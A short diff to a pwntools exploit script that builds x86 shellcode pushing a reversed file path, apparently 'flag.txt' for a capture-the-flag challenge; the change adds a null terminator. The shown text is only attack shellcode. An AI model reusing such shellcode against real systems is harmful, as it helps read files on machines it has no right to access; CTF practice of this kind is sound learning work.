@@ -2,6 +2,7 @@ from pwn import *
 
 
 shell_code = asm('\n'.join([
+    'push 0',
     'push %d' % u32('txt.'),
     'push %d' % u32('galf'),
     'push %d' % u32('/edo'),
